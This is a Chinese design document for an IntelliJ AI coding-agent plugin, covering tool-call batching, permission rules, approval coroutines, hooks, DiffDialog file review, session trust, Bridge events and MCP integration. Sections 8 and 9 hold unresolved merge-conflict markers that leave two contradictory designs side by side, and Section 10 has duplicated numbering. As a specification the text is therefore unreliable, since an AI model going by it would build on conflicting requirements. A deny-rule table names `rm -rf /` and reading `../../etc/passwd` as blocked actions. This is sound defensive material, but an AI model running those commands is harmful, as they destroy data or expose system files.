        val spec = registry.find(call.name)
        val input = JsonParser.parse(call.arguments).asJsonObject
        val safe = spec?.isConcurrencySafe(input) ?: false

        if (safe && result.isNotEmpty() && result.last().isConcurrencySafe) {
            // 追加到当前并发批次
            result[result.lastIndex] = result.last().copy(
                entries = result.last().entries + IndexedValue(index, call)
            )
        } else {
            // 新建批次
            result.add(Batch(safe, listOf(IndexedValue(index, call))))
        }
    }
    return result
}
```

**关键决策**：

| 决策点 | 策略 | 原因 |
|--------|------|------|
| 并发判定 | `isConcurrencySafe(input)` 动态判断 | `run_command` 的安全性取决于具体命令，静态分类过于粗糙 |
| 分区规则 | 连续安全工具合并为并发批次 | 和 Claude Code 的 `partitionToolCalls` 一致，简单且高效 |
| 结果顺序 | `IndexedValue` 保留原始位置 | 模型看到有序结果才能理解因果关系（如先 mkdir 后 touch） |
| 部分失败策略 | 全部执行，各自返回独立结果 | 单个只读工具失败不应阻断其他独立工具 |
| Bash 错误级联 | 同批次内 `run_command` 失败取消后续 `run_command` | Bash 命令常有隐式依赖链 |
| 结果回传 | 等待全部完成后按原始顺序回传 API | OpenAI API 要求一次提交所有 tool_result |

### 7.3 权限策略规则

| 规则类型 | 行为 | 示例 |
|----------|------|------|
| deny_rules | 直接拒绝 | `rm -rf /`、路径穿越 `../../etc/passwd`、workspace 外访问；`run_command` 的命令参数中包含路径穿越模式时同样拦截 |
| allow_rules | 放行（受 session mode 约束） | 白名单内命令、READ_ONLY 工具 |
| session mode | 用户配置的全局权限等级 | READ_ONLY / WORKSPACE_WRITE / DANGER_FULL_ACCESS |
| ask (兜底) | 弹审批框 | 权限升级、非白名单命令 |

### 7.4 审批挂起机制（协程实现）

使用 `withTimeout` + `suspendCancellableCoroutine` 替代 `CompletableFuture.get()`，避免阻塞线程和超时竞态：

```kotlin
private val pendingApprovals = ConcurrentHashMap<String, CancellableContinuation<Boolean>>()

private suspend fun awaitApproval(requestId: String): Boolean {
    return try {
        withTimeout(60_000) {
            suspendCancellableCoroutine { cont ->
                pendingApprovals[requestId] = cont
                cont.invokeOnCancellation {
                    pendingApprovals.remove(requestId)
                }
            }
        }
    } catch (_: TimeoutCancellationException) {
        // 超时自动拒绝，continuation 已由 withTimeout 取消
        pendingApprovals.remove(requestId)
        false
    }
}

// 前端通过 window.__bridge.approvalResponse() 回调时恢复协程
fun onApprovalResponse(requestId: String, decision: String) {
    val cont = pendingApprovals.remove(requestId) ?: return
    val approved = decision == "allow"
    cont.resume(approved)
}
```

**优势**：
- 不阻塞线程池，多个审批可同时挂起而不消耗线程资源
- `withTimeout` 统一管理超时，不存在手动 `delay` + `resume` 的竞态风险
- `TimeoutCancellationException` 时自动清理 `pendingApprovals`，防止泄漏

### 7.5 Pre/Post ToolHook 机制

Dispatcher 在工具执行前后提供 Hook 扩展点，支持日志、指标采集、输入修改、执行拦截等横切关注点。

#### 7.5.1 Hook 接口

```kotlin
interface ToolHook {
    /**
     * 工具执行前调用。
     * 返回 null → 继续执行
     * 返回 ToolResult → 拦截执行，直接返回此结果（不调用 executor）
     */
    suspend fun beforeExecute(toolName: String, input: JsonObject): ToolResult? {
        return null
    }

    /**
     * 工具执行后调用（无论成功或失败）。
     * 可用于日志记录、指标采集、结果增强等。
     */
    suspend fun afterExecute(toolName: String, input: JsonObject, result: ToolResult) {}
}
```

#### 7.5.2 Hook 注册

```kotlin
class ToolCallDispatcher(...) {
    private val hooks = mutableListOf<ToolHook>()

    fun addHook(hook: ToolHook) {
        hooks.add(hook)
    }
}
```

#### 7.5.3 Hook 在 dispatch 中的集成位置

```
dispatch() 流程（节选）
  │
  ├─ ... 权限检查通过 ...
  │
  ├─ Pre-Hooks（按注册顺序执行，责任链模式）
  │     var intercepted: ToolResult? = null
  │     for (hook in hooks) {
  │         val result = hook.beforeExecute(toolName, input)
  │         if (result != null) {
  │             intercepted = result
  │             break                          // 短路：第一个拦截后不再调用后续 Pre-Hook
  │         }
  │     }
  │
  ├─ 执行（仅在未被拦截时）
  │     val finalResult = intercepted ?: executor.execute()
  │
  ├─ 输出截断
  │
  ├─ Post-Hooks（无论是否被拦截，均按注册顺序执行）
  │     for (hook in hooks) {
  │         hook.afterExecute(toolName, input, finalResult)
  │     }
  │
  └─ 返回 ToolResult
```

**执行语义总结**：

| 场景 | Pre-Hook 行为 | executor | Post-Hook 行为 |
|------|--------------|----------|----------------|
| 所有 Hook 返回 null | 全部执行 | 执行 | 全部执行 |
| 第 N 个 Hook 拦截 | 前 N 个执行，后续跳过 | **跳过** | 全部执行 |
| Hook 抛出异常 | 跳过该 Hook，继续执行下一个 | 正常执行 | 全部执行 |

> **设计决策**：Pre-Hook 使用短路语义（第一个拦截即停止），确保只有一个拦截结果生效。Post-Hook 始终全部执行，保证日志和指标采集不遗漏。Hook 异常不阻断流程——单个 Hook 的 bug 不应导致整个工具调用失败。

#### 7.5.4 内置 Hook 示例

| Hook | 用途 |
|------|------|
| `ToolExecutionLogger` | 记录工具调用耗时和结果摘要到 IDE 日志 |
| `ToolMetricsCollector` | 采集工具调用频率、成功率、延迟等指标 |
| 用户自定义 Hook | 用户通过 Settings 或插件注册的额外校验/增强逻辑 |

初期只实现 `ToolExecutionLogger`，其他按需添加。Hook 接口为未来扩展（如用户自定义 Hook、插件 Hook）预留了空间，不需要修改 Dispatcher 核心逻辑。

---

## 8. IDE 原生文件变更体验

> **核心理念**：CodePlanGUI 是 IntelliJ 插件，不是 CLI 工具。文件变更的审批和展示应该用 IDE 原生组件（DiffDialog、编辑器高亮、Inspection），而非在 WebView 中模拟终端体验。这是与 Claude Code / Cursor 等产品的核心差异化。

### 8.1 两种变更模式

文件写操作（`edit_file` / `write_file`）根据信任状态走两条路径：

```
edit_file / write_file 触发
  │
  ├─ sessionFileWriteTrusted == false → 审批模式（§8.2）
  │   └─ 弹出 IntelliJ DiffDialog（与 Git diff 同一组件）
  │
  └─ sessionFileWriteTrusted == true → 信任模式（§8.4）
      └─ 直接写入 + 编辑器内联高亮 + Ctrl+Z 可撤销
```

### 8.2 审批模式 — IntelliJ DiffDialog

未信任状态下，文件修改弹出 IDE 原生的 DiffDialog：

```
EditFileExecutor / WriteFileExecutor 修改已有文件
  │
  ├─ 路径安全检查：resolveToolPath(path)
  │   不在 workspace 内 → ToolResult(ok=false)
  │
  ├─ 读取当前文件内容
  │
  ├─ 生成变更内容（内存中，不写入磁盘）
  │
<<<<<<< Updated upstream
  ├─ 通过 Bridge 发送 diff 审批请求
  │   调用: notifyFileChangeRequest() → buildEventJS("file_change_request", ...)
  │   → onEvent("file_change_request", payload) → groupReducer
  │
  ├─ 协程挂起 awaitApproval()，等待前端 window.__bridge.fileChangeResponse() 回调
=======
  ├─ 弹出 IntelliJ DiffDialog
  │   ├─ 左侧：当前文件内容（只读）
  │   ├─ 右侧：修改后内容（只读）
  │   ├─ 标题栏：path + "+N / -N" 统计
  │   ├─ 操作按钮："Accept" / "Reject"
  │   │   + 复选框："Trust this session"（当 allowSessionFileTrust=true 时展示）
  │   ├─ 导航：Next Change / Previous Change（IDE 原生快捷键 F7 / Shift+F7）
  │   └─ 大 diff 时顶部展示摘要条（§8.6）
  │
  ├─ 协程挂起 awaitApproval()，等待用户操作
>>>>>>> Stashed changes
  │
  ├─ 用户 Reject → ToolResult(ok=false, "User rejected")
  │
  └─ 用户 Accept → WriteAction 写入 → 触发 Post-Edit 管线（§8.5）→ ToolResult(ok=true)
```

**与 CLI 的关键区别**：
- DiffDialog 是 IDE 用户每天都在用的组件（Git diff、Compare with...），**零学习成本**
- 支持 F7 / Shift+F7 在变更之间导航，**键盘友好**
- 支持语法高亮（基于 IDE 的 LanguageFileType），**代码可读性好**
- 支持 Cmd/Ctrl+F 在 diff 内搜索

### 8.3 新建文件确认 — IDE 原生确认框

新建文件不适用 diff（无原文），弹出 IntelliJ 的 ConfirmDialog + 内容预览：

```
WriteFileExecutor 创建新文件
  │
  ├─ 路径安全检查：resolveToolPath(path)
  │
  ├─ 文件不存在 → 新建文件确认流程
  │
<<<<<<< Updated upstream
  ├─ 通过 Bridge 发送新建文件确认请求
  │   调用: notifyFileCreateRequest() → buildEventJS("file_create_request", ...)
  │   → onEvent("file_create_request", payload) → groupReducer
  │   Payload: {
  │     requestId,
  │     path,
  │     size: content.length,
  │     preview: content 的前 20 行,
  │     language: 根据扩展名推断的语言标识
  │   }
  │
  ├─ 协程挂起 awaitApproval()，等待前端 window.__bridge 回调
=======
  ├─ 弹出 IntelliJ ConfirmDialog
  │   ├─ 标题："Create new file?"
  │   ├─ 内容面板：EditorTextField（IDE 原生代码编辑器组件）
  │   │   ├─ 路径：src/main/kotlin/NewService.kt
  │   │   ├─ 大小：2.4 KB / 87 lines
  │   │   ├─ 语言：Kotlin（自动推断）
  │   │   └─ 完整内容（可滚动，语法高亮）
  │   ├─ 复选框："Trust this session"（当 allowSessionFileTrust=true 时展示）
  │   └─ 操作按钮："Create" / "Cancel"
  │
  ├─ 用户 Cancel → ToolResult(ok=false, "User rejected")
>>>>>>> Stashed changes
  │
  └─ 用户 Create → WriteAction 写入 → 触发 Post-Edit 管线（§8.5）→ ToolResult(ok=true)
```

**与 CLI 的关键区别**：
- 使用 `EditorTextField` 展示内容，享受 IDE 的语法高亮、代码折叠、行号
- 用户可以在确认框中直接滚动浏览完整内容

<<<<<<< Updated upstream
#### Kotlin → 前端（走 `onEvent` 统一通道）

| 事件 type | Payload 字段 | 说明 |
|-----------|-------------|------|
| `file_change_request` | requestId, path, diff, stats | 修改已有文件的 diff 审批 |
| `file_create_request` | requestId, path, size, preview, language | 新建文件的确认 |

#### 前端 → Kotlin（走 `window.__bridge` 动作方法）

| 动作方法 | 参数 | 说明 |
|----------|------|------|
| `fileChangeResponse` | requestId, decision | `"allow"` 或 `"deny"` |
| `fileCreateResponse` | requestId, decision | `"allow"` 或 `"deny"` |
=======
### 8.4 信任模式 — 直接写入 + 内联高亮

信任后文件修改不再弹框，但用户仍能感知变更——通过**编辑器内联高亮**（IntelliJ 的 `LineMarkerProvider` / `HighlightVisitor`）：

```
信任模式下文件写入
  │
  ├─ WriteAction 写入文件
  │
  ├─ 编辑器内联高亮（非弹框，不阻断工作流）
  │   ├─ 新增行 → 左侧 gutter 绿色标记 + 行背景浅绿色
  │   ├─ 删除行 → 左侧 gutter 红色标记（可点击查看原文）
  │   └─ 修改行 → 左侧 gutter 蓝色标记
  │   与 Git 的"未提交变更"高亮完全一致——用户已有肌肉记忆
  │
  ├─ 同时通过 Bridge 发送 file_change_auto 通知（§8.7.4）
  │   前端在聊天流中内联展示：
  │   📝 ChatService.kt  (+12 / -3)   [Open in Editor]
  │   点击 → IDE 打开对应文件并定位到变更区域
  │
  └─ 用户不满意 → Ctrl+Z 撤销（IDE 原生 undo 栈）
```

**与 CLI 的关键区别**：
- 变更直接在编辑器中可视化，与 Git diff 高亮体验一致
- Ctrl+Z 撤销是 IDE 原生能力，每个变更都是一个 undo step
- 用户可以继续编辑，不受任何阻断
>>>>>>> Stashed changes

### 8.5 Post-Edit 质量管线

**这是 IDE 插件独有的能力——CLI 工具做不到。**

文件写入后，自动运行 IDE 原生质量检查，将结果反馈给 AI：

```
WriteAction 完成
  │
  ├─ 1. Optimize Imports（自动，无感）
  │     清除未使用的 import，补充缺失的 import
  │
  ├─ 2. Reformat Code（自动，按项目 .editorconfig / .ktlint 配置）
  │     统一代码风格
  │
  ├─ 3. IDE Inspection（异步，不阻断）
  │     ├─ 运行 IntelliJ 的代码检查（error / warning / info）
  │     ├─ 结果收集到 InspectionResult
  │     │   errors:   [{line, message}, ...]   // 红色，必须修复
  │     │   warnings: [{line, message}, ...]   // 黄色，建议修复
  │     │   info:     [{line, message}, ...]   // 灰色，可选
  │     │
  │     └─ 将 InspectionResult 附加到 ToolResult.output：
  │         "File written successfully.
  │          ⚠ Inspection found 1 error, 2 warnings:
  │          ERROR  line 42: Unresolved reference: 'dispatcher'
  │          WARN   line 15: Unused import: 'java.util.concurrent.*'
  │          WARN   line 88: Function 'processToolCall' is never used"
  │
  └─ AI 根据 Inspection 反馈自行决定是否修复
```

**实现**：

```kotlin
class PostEditPipeline(private val project: Project) {

    data class InspectionResult(
        val errors: List<Finding>,    // must fix
        val warnings: List<Finding>,  // should fix
        val info: List<Finding>       // optional
    )

    data class Finding(val line: Int, val severity: String, val message: String)

    /**
     * 在 WriteAction 之后执行质量管线。
     * optimize + reformat 是同步的（毫秒级），
     * inspection 是异步的（可能耗时数百毫秒），不阻断 ToolResult 返回。
     */
    suspend fun runAfterWrite(virtualFile: VirtualFile): InspectionResult? {
        // 1 & 2: 同步执行（在 WriteAction 内或紧随其后）
        CodeInsightUtil.getInstance(project).optimizeImports(virtualFile)
        CodeStyleManager.getInstance(project).reformat(virtualFile)

        // 3: 异步 inspection，结果通过回调收集
        return runInspectionAsync(virtualFile)
    }
}
```

**关键约束**：
- Optimize Imports 和 Reformat 是自动执行的，**不可关闭**——这是 IDE 插件的基本价值
- Inspection 是异步的，不阻断 ToolResult 返回。AI 拿到的是最终结果（含 inspection 反馈）
- Inspection 结果中只有 **error** 级别的问题会强制反馈给 AI，warning/info 可通过 Settings 配置是否反馈
- 如果 AI 修复了 inspection 发现的问题，修复本身也走信任/审批流程（递归但有限次，见 §6.5 频率限制）

### 8.6 大 Diff 摘要条

审批模式下，diff 超过 `DIFF_SUMMARY_THRESHOLD`（默认 100 行）时，DiffDialog 顶部展示摘要条：

```
┌──────────────────────────────────────────────────────────────────────┐
│ ℹ Large change: +45 / -120 lines | Affected: sendMessage(),        │
│   handleToolCallComplete()  [Expand All]                            │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  (标准 DiffDialog 内容区)                                            │
│                                                                      │
├──────────────────────────────────────────────────────────────────────┤
│  [☐ Trust this session]                     [Reject]  [Accept]       │
└──────────────────────────────────────────────────────────────────────┘
```

**实现策略**：
- 摘要条是 DiffDialog 的自定义顶部面板（`JPanel` / `JBCollapsablePanel`）
- 涉及函数/类名由 Kotlin 后端在生成 diff 时通过正则提取（匹配 `fun `、`class `、`def ` 等声明行）
- 数据通过 `DiffDialog` 的 `UserData` 传入，**不经过 Bridge**（纯 IDE 侧交互）

**阈值**：`DIFF_SUMMARY_THRESHOLD = 100`（行数），可通过 Settings 配置。

### 8.7 审批疲劳缓解

高频文件修改场景下，逐条 diff 审批会打断用户工作流。提供会话级信任机制：

#### 8.7.1 交互设计

DiffDialog 和新建文件确认框底部增加复选框：

```
[☐ Trust this session — auto-apply all file changes]

[Reject]  [Accept]
```

- 勾选后点击 Accept：当前操作正常执行，**且当前会话内后续所有 `edit_file` / `write_file` 进入信任模式（§8.4），不再弹框**
- 不勾选直接点击 Accept：仅本次放行，下次仍弹框
- 点击 Reject：无论是否勾选，仅拒绝本次操作，不影响后续

#### 8.7.2 后端状态管理

```kotlin
// ToolCallDispatcher 中维护会话级信任状态
class ToolCallDispatcher(...) {
    @Volatile
    private var sessionFileWriteTrusted = false

    // 在 authorize() 流程中检查
    // edit_file / write_file 且 sessionFileWriteTrusted == true → 直接 ALLOW
    // 弹框时如果用户勾选了信任 → 回调时设置 sessionFileWriteTrusted = true
}
```

| 时机 | 状态变更 |
|------|----------|
| 新会话开始 | `sessionFileWriteTrusted = false` |
| 用户勾选信任 + 接受 | `sessionFileWriteTrusted = true` |
| 用户点击"新对话" | 重置为 `false` |
| IDE 关闭 | 重置为 `false` |

#### 8.7.3 Settings 全局开关

Settings 中新增配置控制此功能的可见性：

| 字段 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `allowSessionFileTrust` | Boolean | `true` | 是否在 DiffDialog 中展示"Trust this session"选项 |

当 `allowSessionFileTrust = false` 时，DiffDialog 不展示复选框，每次文件修改都需要审批。适用于对安全性要求极高的项目。

#### 8.7.4 受信任状态下的变更通知

信任后文件修改不再弹框，但用户仍需感知变更发生。Dispatcher 在 `sessionFileWriteTrusted = true` 时，每次文件修改发送轻量通知事件（非阻塞）：

| 事件 type | Payload | 说明 |
|-----------|---------|------|
| `file_change_auto` | `{path, stats: {added, removed}}` | 自动执行的文件变更通知 |

前端收到此事件后，在聊天流中内联展示一行轻量提示（非弹框）：

```
📝 ChatService.kt  (+12 / -3)   [查看 Diff]
```

点击"Open in Editor"调用 `window.__bridge.openFile(path, line)` 打开 IDE 编辑器并定位到变更区域。

---

## 9. Bridge 事件体系扩展

> **架构前提**：Phase 1 已将 15 个独立回调统一为单一 `onEvent(type, payload)` 通道（`buildEventJS()` → `onEvent`）。Phase 2 引入 `MessageGroup[]` 替代扁平 `Message[]`，`eventReducer` 升级为 `groupReducer`。本节在此基础上扩展。

### 9.1 现有事件（保留，走 `onEvent` 通道）

Phase 1 已将以下事件统一到 `onEvent(type, payload)` 通道：

| 事件 type | Payload | 说明 |
|-----------|---------|------|
| `approval_request` | `{requestId, command, description}` | 命令审批请求 |
| `execution_card` | `{requestId, command, description}` | 执行卡片创建 |
| `execution_status` | `{requestId, status, result}` | 执行状态更新 |
| `log` | `{requestId, line, type}` | 执行日志 |
| `round_end` | `{msgId}` | 工具调用轮次结束（Phase 2 激活） |

### 9.2 新增事件（新增 type，复用 `onEvent` 通道）

<<<<<<< Updated upstream
新增 2 个 IDE → 前端事件类型，直接在 `groupReducer` 中新增 case 处理：

| 事件 type | Payload | 说明 |
|-----------|---------|------|
| `file_change_request` | `{requestId, path, diff, stats: {added, removed}}` | 文件修改 diff 审批请求 |
| `file_create_request` | `{requestId, path, size, preview, language}` | 新建文件确认请求 |

新增 2 个前端 → IDE 动作方法（挂载到 `window.__bridge` 动作接口）：

| 动作方法 | 参数 | 说明 |
|----------|------|------|
| `fileChangeResponse` | `(requestId, decision)` | `"allow"` 或 `"deny"` |
| `fileCreateResponse` | `(requestId, decision)` | `"allow"` 或 `"deny"` |

### 9.3 现有事件扩展

**`approval_request`** 增加 `toolName` 和 `toolInput` 字段：
=======
新增 IDE → 前端事件类型，直接在 `groupReducer` 中新增 case 处理：

| 事件 type | Payload | 说明 |
|-----------|---------|------|
| `file_change_auto` | `{path, stats: {added, removed}}` | 信任模式下自动执行的文件变更通知（§8.7.4，非阻塞） |

> **变更说明**：`file_change_request` 和 `file_create_request` 已移除——文件审批改用 IDE 原生 DiffDialog / ConfirmDialog（§8.2/§8.3），不再通过 Bridge → WebView 路径。变更通知仅保留 `file_change_auto` 用于前端聊天流内联展示。

新增 1 个前端 → IDE 动作方法（挂载到 `window.__bridge` 动作接口）：

| 动作方法 | 参数 | 说明 |
|----------|------|------|
| `openFile` | `(path: string, line?: number)` | 在 IDE 编辑器中打开指定文件并定位到指定行（§8.4 "Open in Editor" 按钮） |

### 9.3 现有事件扩展

**`approval_request`** payload 扩展：
>>>>>>> Stashed changes

| 字段 | 现有 | 变更 |
|------|------|------|
| `requestId` | ✓ | 不变 |
<<<<<<< Updated upstream
| `command` | ✓ | → 改名 `toolInput`（通用化，兼容旧值） |
| `description` | ✓ | 不变 |
| `toolName` | — | **新增**（如 `run_command`、`mcp__xxx`） |
=======
| `command` | ✓ | **保留**（deprecated，兼容过渡期，值与 `toolInput` 相同） |
| `toolInput` | — | **新增**（通用化输入，`run_command` 时为命令文本，其他工具为参数摘要） |
| `description` | ✓ | 不变 |
| `toolName` | — | **新增**（如 `run_command`、`mcp__xxx`） |

**迁移策略**：双字段并行一个版本（v3.2），前端优先读取 `toolInput`，fallback 到 `command`。**v3.3 移除 `command` 字段**——届时前端已全部迁移至 `toolInput`，删除 `command` 不构成 breaking change。
>>>>>>> Stashed changes

前端根据 `toolName` 渲染不同审批 UI：
- `run_command` → 展示命令 + 描述（现有样式）
- `edit_file` / `write_file` → 跳过审批弹框（由 `file_change_request` / `file_create_request` 独立处理）
- 其他工具 → 展示工具名 + 参数摘要

### 9.4 BridgeHandler.kt 变更

所有新事件均通过 `buildEventJS()` 生成，走统一 `onEvent` 通道：

| 方法 | 变更 |
|------|------|
| `notifyApprovalRequest` | payload 增加 `toolName`、`command` 改名 `toolInput`；内部改为 `flushAndPush(buildEventJS("approval_request", ...))` |
| `notifyFileChangeRequest` | **新增** — `flushAndPush(buildEventJS("file_change_request", ...))` |
| `notifyFileCreateRequest` | **新增** — `flushAndPush(buildEventJS("file_create_request", ...))` |

调度策略：
- `approval_request` / `file_change_request` / `file_create_request` → `flushAndPush`（结构性事件，需先刷空待处理 token）
- 与 Phase 1 中 `execution_card`、`approval_request` 的调度策略一致

### 9.5 bridge.d.ts 变更

Bridge 接口保持 `onEvent` + 动作方法结构不变，仅扩展动作方法：

```typescript
interface Bridge {
  // 统一事件通道（Kotlin → JS）— 不变
  onEvent: (type: string, payloadJson: string) => void

  // 动作方法（JS → Kotlin）
  sendMessage: (text: string, includeContext: boolean) => void
  approvalResponse: (requestId: string, action: string, addToWhitelist?: boolean) => void
<<<<<<< Updated upstream
  fileChangeResponse: (requestId: string, decision: string) => void    // 新增
  fileCreateResponse: (requestId: string, decision: string) => void    // 新增
=======
  openFile: (path: string, line?: number) => void              // 新增：在 IDE 编辑器中打开文件
>>>>>>> Stashed changes
  cancelStream: () => void
  newChat: () => void
  openSettings: () => void
  debugLog: (message: string) => void
  frontendReady: () => void
}
```

<<<<<<< Updated upstream
### 9.6 前端 groupReducer 扩展

新增事件类型在 `groupReducer`（Phase 2 引入，替代 `eventReducer`）中新增 case：
=======
> **变更说明**：`fileChangeResponse` / `fileCreateResponse` 已移除——文件审批改用 IDE 原生组件，不再经过 WebView Bridge。新增 `openFile` 用于前端"Open in Editor"按钮回调。

### 9.6 前端 groupReducer 扩展

新增事件类型在 `groupReducer`（Phase 2 引入，替代 `eventReducer`）中新增 case。

**注意**：多个 tool_call 可能并发触发多个审批请求，因此审批状态使用 `Map<requestId, Review>` 结构，而非单一对象：
>>>>>>> Stashed changes

```typescript
case "file_change_request":
  return {
    ...state,
<<<<<<< Updated upstream
    fileChangeReview: {
      requestId: payload.requestId,
      path: payload.path,
      diff: payload.diff,
      stats: payload.stats,
=======
    fileChangeReviews: {
      ...state.fileChangeReviews,
      [payload.requestId]: {
        requestId: payload.requestId,
        path: payload.path,
        diff: payload.diff,
        stats: payload.stats,
      },
>>>>>>> Stashed changes
    },
  }

case "file_create_request":
  return {
    ...state,
<<<<<<< Updated upstream
    fileCreateReview: {
      requestId: payload.requestId,
      path: payload.path,
      size: payload.size,
      preview: payload.preview,
      language: payload.language,
    },
  }
=======
    fileCreateReviews: {
      ...state.fileCreateReviews,
      [payload.requestId]: {
        requestId: payload.requestId,
        path: payload.path,
        size: payload.size,
        content: payload.content,           // 完整内容
        totalLines: payload.totalLines,     // 总行数
        language: payload.language,
      },
    },
  }

// 审批完成后移除对应 entry
case "file_change_response":
  const { [payload.requestId]: _, ...restChange } = state.fileChangeReviews
  return { ...state, fileChangeReviews: restChange }

case "file_create_response":
  const { [payload.requestId]: __, ...restCreate } = state.fileCreateReviews
  return { ...state, fileCreateReviews: restCreate }
```
>>>>>>> Stashed changes
```

`approval_request` 的 case 扩展为根据 `toolName` 区分渲染逻辑（现有命令审批 + 通用工具审批）。

---

## 10. MCP 接入（M5）

接入 MCP 只需以下步骤，**不修改 ToolCallDispatcher 核心调度逻辑**：

### 10.1 McpToolExecutor

实现 `ToolExecutor` 接口，内部委托给 MCP Client 的远程调用。

### 10.2 工具包装

MCP Server 上线时：
- 调用 `listTools()` 发现远程工具
- 每个工具包装为 ToolSpec，名称加前缀 `mcp__<server>__<tool>` 避免冲突
- 调用 `registry.addTools()` 动态注册

MCP Server 下线时：
- 调用 `registry.removeTool()` 移除对应工具
- 调用 `registry.addDisposer()` 注册连接清理函数

### 10.3 权限策略

MCP 工具**不默认放行**，采用信任分级：

| 信任级别 | 权限 | 条件 |
|----------|------|------|
| 未信任 | DANGER_FULL_ACCESS | 每次调用都弹审批框 |
| 已信任 | WORKSPACE_WRITE | 用户在 Settings 中将 server 加入信任列表 |

**Settings 新增**：

```
MCP Server Trust
  ┌──────────────────┬─────────────┐
  │ Server           │ Trusted     │
  ├──────────────────┼─────────────┤
  │ @anthropic/files │     ✓       │
  │ @custom/tools    │     ✕       │
  └──────────────────┴─────────────┘
```

**设计说明**：MCP 是外部工具，不能假设安全。默认需审批是最安全的策略，用户显式信任后才自动放行。

### 10.4 MCP 工具能力协商

MCP 协议标准定义了 `tool.annotations` 字段，用于声明工具的语义能力。CodePlanGUI 映射如下：

| MCP Annotation | ToolSpec 方法 | 类型 | 默认值 | 说明 |
|---|---|---|---|---|
| `annotations.readOnlyHint` | `isConcurrencySafe(input)` / `isReadOnly(input)` | Boolean | `false` | 只读工具天然可安全并发 |
| `annotations.destructiveHint` | `isDestructive(input)` | Boolean | `false` | 标记破坏性操作 |
| `annotations.openWorldHint` | `isOpenWorld(input)` | Boolean | `false` | 标记可能访问外部网络/系统的操作 |

**映射实现**（在 MCP 工具注册时）：

```kotlin
fun buildMcpToolSpec(serverName: String, mcpTool: McpToolDefinition): ToolSpec {
    val annotations = mcpTool.annotations
    return ToolSpec(
        name = "mcp__${serverName}__${mcpTool.name}",
        description = mcpTool.description,
        inputSchema = mcpTool.inputSchema,
        requiredPermission = classifyMcpPermission(annotations),
        // MCP 工具做工具级别静态声明，无法按输入动态判断
        isConcurrencySafe = { annotations?.readOnlyHint ?: false },
        isReadOnly = { annotations?.readOnlyHint ?: false },
        isDestructive = { annotations?.destructiveHint ?: false },
    )
}
```

**与内置工具的关键区别**：

| 维度 | 内置工具 | MCP 工具 |
|------|----------|----------|
| 能力判定粒度 | **输入级别**动态判断（如 `run_command` 分析具体命令） | **工具级别**静态声明（基于 annotations） |
| 默认值策略 | 各工具自行实现 | Fail-closed：全部默认 `false`（保守安全） |
| 并发优化 | `run_command cat` 可并发，`run_command npm install` 串行 | 声明 `readOnlyHint=true` 的工具可并发，其余串行 |

**分层默认机制**：

```
TOOL_DEFAULTS（全部 false）
    ↓ 覆盖
MCP Server 注册时用 annotations 覆盖
    ↓ 对比
内置工具自己实现，做输入级别精细判断
```

### 10.5 MCP 传输层与连接管理

MCP Server 通过传输协议与 CodePlanGUI 通信。第一版支持两种标准传输：

| 传输方式 | 适用场景 | 实现 |
|----------|----------|------|
| **stdio** | 本地 MCP Server（子进程） | `ProcessBuilder` 启动，stdin/stdout JSON-RPC |
| **SSE** | 远程 MCP Server（HTTP） | OkHttp SSE 长连接，JSON-RPC over HTTP |

**连接生命周期**：

```
插件启动
  │
  ├─ 读取 Settings 中已配置的 MCP Server 列表
  │
  ├─ 逐个建立连接
  │   ├─ stdio: 启动子进程，握手
  │   └─ SSE: 建立 HTTP 连接，握手
  │
  ├─ 连接成功 → listTools() → 注册到 ToolRegistry
  │   └─ 注册连接健康检查（心跳 ping，默认 30s）
  │
  ├─ 连接失败 → 重试（指数退避，最多 3 次）
  │   └─ 仍失败 → 标记 server 为 disconnected，前端展示状态
  │
  └─ 连接断开（心跳超时 / 进程退出）
      ├─ 标记 server disconnected
      ├─ 从 ToolRegistry 移除该 server 的所有工具
      └─ 自动重连（指数退避）
```

**McpConnectionManager 职责**：

| 方法 | 说明 |
|------|------|
| `connect(serverConfig)` | 建立连接、握手、注册工具 |
| `disconnect(serverName)` | 断开连接、移除工具 |
| `reconnect(serverName)` | 重连 |
| `listConnectedServers()` | 列出所有已连接 server 及状态 |
| `onServerOnline(callback)` | Server 上线回调 |
| `onServerOffline(callback)` | Server 下线回调 |

连接管理器通过 IntelliJ 的 `Disposable` 绑定 Project 生命周期，插件关闭时自动断开所有连接。

### 10.6 Schema 热更新

MCP Server 升级后工具接口可能变化。需要热更新机制避免重启连接：

**触发条件**：

| 事件 | 处理 |
|------|------|
| Server 主动通知 `notifications/tools/list_changed` | 立即重新 `listTools()`，差异更新 Registry |
| 心跳 ping 成功但工具调用 404 | 触发一次 `listTools()` 同步 |
| 连接断开后重连成功 | 自动重新 `listTools()` |

**差异更新策略**：

```kotlin
fun syncTools(serverName: String, newTools: List<McpToolDefinition>) {
    val existingNames = registry.list()
        .filter { it.startsWith("mcp__${serverName}__") }
        .toSet()
    val newNames = newTools.map { "mcp__${serverName}__${it.name}" }.toSet()

    // 移除已删除的工具
    (existingNames - newNames).forEach { registry.removeTool(it) }

    // 注册新增/变更的工具（addTools 对已存在的同名工具静默跳过，
    // 因此变更的工具需要先 removeTool 再 addTools）
    val added = newNames - existingNames
    val possiblyChanged = newNames.intersect(existingNames)

    added.forEach { tool ->
        registry.addTools(listOf(buildMcpToolSpec(serverName, tool)))
    }

    // 变更检查：比较 inputSchema hash
    possiblyChanged.forEach { toolName ->
        val oldSpec = registry.find(toolName)!!
        val newSpec = buildMcpToolSpec(serverName, newTools.find { "mcp__${serverName}__${it.name}" == toolName }!!)
        if (oldSpec.inputSchema != newSpec.inputSchema) {
            registry.removeTool(toolName)
            registry.addTools(listOf(newSpec))
        }
    }
}
```

### 10.7 MCP 工具基础参数校验

### 10.5 MCP 工具基础参数校验

MCP 工具的 `inputSchema` 从远程动态获取，不做完整的本地 schema 校验。但 Dispatcher 在调用 MCP executor 前执行以下基础校验（作为 Dispatcher 内置逻辑，**非 Hook**——安全校验不应可通过 Hook 注册遗漏来绕过）：

| 检查项 | 规则 | 失败行为 |
|--------|------|----------|
| 参数总体大小 | `arguments.toString().length ≤ 1MB` | `ToolResult(ok=false, "Input too large")` |
| 必填参数存在性 | 遍历 schema.required[]，检查对应字段非 null | `ToolResult(ok=false, "Missing required parameter: xxx")` |
| 字符串参数长度 | 单个 String 值 ≤ 500KB | `ToolResult(ok=false, "Parameter 'xxx' too large")` |

不做类型校验和格式校验——这些由 MCP Server 端负责。基础校验的目的是防止明显无效的请求浪费网络往返。

